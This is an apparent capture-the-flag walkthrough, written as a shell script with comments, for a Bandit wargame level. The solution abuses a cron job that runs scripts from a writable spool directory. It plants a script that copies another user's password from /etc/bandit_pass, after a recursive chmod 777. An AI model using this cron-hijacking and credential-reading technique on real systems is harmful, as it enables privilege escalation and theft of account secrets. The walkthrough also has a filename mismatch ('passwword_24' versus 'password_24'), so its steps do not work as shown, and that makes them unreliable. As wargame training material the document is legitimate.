#!/bin/sh
# Level Goal: A program is running automatically at regular intervals from
# cron, the time-based job scheduler. Look in /etc/cron.d/ for the 
# configuration and see what command is being executed.

# NOTE: This level requires you to create your own first shell-script.
# This is a very big step and you should be proud of yourself when you
# beat this level!

# NOTE 2: Keep in mind that your shell script is removed once executed, so
# you may want to keep a copy around…

cat /etc/cron.d/cronjob_bandit24
# -> @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
# -> * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

cat /usr/bin/cronjob_bandit24.sh
# -> #!/bin/bash
# -> myname=$(whoami)
# -> cd /var/spool/$myname/foo
# -> echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
# -> for i in * .*;
# -> do
# ->     if [ "$i" != "." -a "$i" != ".." ];
# ->     then
# ->         echo "Handling $i"
# ->         owner="$(stat --format "%U" ./$i)"
# ->         if [ "${owner}" = "bandit23" ]; then
# ->             timeout -s 9 60 ./$i
# ->         fi
# ->         rm -f ./$i
# ->     fi
# -> done


cd /tmp/my-temp-folder
nano copy_password.sh
# Create file in my temp folder containing the following
# #!/bin/bash
# myname=$(whoami)
# cat /etc/bandit_pass/$myname > /tmp/my-temp-folder/passwword_24

touch password_24

# Change the permissions so that bandit24 can run the script and save to the file
chmod 777 -R /tmp/my-temp-folder

# Copy file created in temp to /var/spool/bandit24/foo
cp /tmp/my-temp-folder/copy_password.sh /var/spool/bandit24/foo

# Wait a minute for the script to execute. Then display contents of password_24
cat password_24
# -> password

